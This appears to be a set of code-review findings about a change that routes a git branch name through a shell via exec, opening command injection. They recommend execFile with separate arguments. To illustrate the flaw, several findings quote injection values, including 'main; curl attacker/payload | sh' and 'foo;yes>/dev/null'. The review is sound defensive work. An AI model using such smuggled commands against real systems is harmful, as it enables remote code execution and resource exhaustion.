findings.title: [P1] Keep the branch argument out of the shell
findings.body: When `branch` contains shell syntax such as `main; arbitrary-command`, `exec` interprets it and runs the injected command with the application's privileges. It can also misparse branch values containing shell metacharacters. Preserve argument separation with `execFile("git", ["show", branch])`.

findings.title: [P2] Preserve direct child cancellation instead of spawning Git through a shell
findings.body:
On Windows, `exec()` returns the `cmd.exe` shell process rather than the `git.exe` process. If a caller cancels a long-running `git show` via `showBranch(...).kill()`, only the shell is terminated; Git can continue consuming resources and retaining inherited stdio handles, delaying `close` completion. `execFile()` allowed callers to terminate Git directly.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of a shell
findings.body:
`exec` interpolates `branch` into a shell command. If a caller passes attacker-controlled input such as `HEAD; curl attacker/... | sh`, arbitrary commands execute with the process’s privileges. Shell metacharacters can also break valid Git refs; `execFile("git", ["show", branch])` avoided both issues.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-vector execution to prevent shell command injection
findings.body:
`exec()` passes the interpolated branch name through a shell. Any untrusted value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. The previous `execFile("git", ["show", branch])` treated the branch as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch arguments out of the shell
findings.body:
`exec` passes `branch` through `/bin/sh`, and valid Git branch names may contain shell metacharacters. Calling `showBranch("foo;yes>/dev/null")` launches an unbounded `yes` process with no timeout, indefinitely consuming CPU; repeated calls can exhaust process and CPU resources. Use `execFile("git", ["show", branch])`.

_Recommend validating this comment independently._
